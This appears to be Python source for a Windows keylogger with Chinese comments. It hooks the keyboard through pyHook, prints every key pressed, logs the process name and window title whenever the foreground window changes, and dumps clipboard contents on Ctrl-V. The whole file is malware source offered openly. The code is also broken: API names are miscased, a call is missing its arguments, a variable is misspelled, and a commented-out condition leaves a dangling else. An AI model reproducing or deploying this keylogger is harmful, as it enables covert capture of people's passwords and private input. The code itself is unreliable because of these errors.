from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import pdb

# pdb.set_trace()
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    # 获取前台窗口的句柄
    hwnd = user32.GetForeGroundwindow()

    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId()

    process_id = '%d' % pid.value
    #申请内存
    executable = create_string_buffer('\x00' * 512)
    h_process = kernel32.OpenProcess(0x10 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    #读取差UN港口标题
    widnow_title = create_string_buffer('\x00' * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    #输出进程相关信息
    print('[PID: %s - %s -%s]' % (process_id, executable.value, window_title.value))

    #关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def keyStroke(event):
    global current_window

    # pdb.set_trace()
    # 检查目标是否切换了窗口
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    ## 检查是否为常规按键（非组合按键）
    #if event.Ascii > 32 and event.Ascii < 127:
    #    print(chr(event.Ascii))
    else:
        # 如果输入为[Ctrl -V],获取当前剪切板的内容
        if event.Key == 'V':
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print('[PASTE] - %s' % (pasted_value))
        else:
            print('[%s]' % event.Key)

    # 返回值到下一个钩子时间触发
    return True

# 创建和注册 钩子函数管理器
#pdb.set_trace()
K1 = pyHook.HookManager()
K1.KeyDown = keyStroke

# 注册键盘记录的钩子，然后永久执行
K1.HookKeyboard()
pythoncom.PumpMessages()
